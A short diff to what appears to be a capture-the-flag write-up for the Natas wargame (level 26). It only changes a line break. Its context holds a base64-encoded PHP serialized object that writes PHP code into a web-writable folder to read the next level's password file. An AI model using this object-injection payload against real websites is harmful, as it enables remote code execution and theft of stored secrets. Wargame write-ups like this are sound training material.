@@ -208,7 +208,7 @@ Output
 Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czozNDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvbG9nLnR4dCI7czoxNToiAExvZ2dlcgBpbml0TXNnIjtzOjIzOiJTZXJpYWxpemF0aW9uIEJ1Z2dzISEhCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjYzOiI8P3BocCBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCcvZXRjL25hdGFzX3dlYnBhc3MvbmF0YXMyNycpOyA/PgoiO30=
 ```
 <br/>
-Observations:
+Observations:<br/>
   - We get the contents of the file storing password for next Level <br/>
   - we can write to `img` directory, so we store log file there. <br/>
  
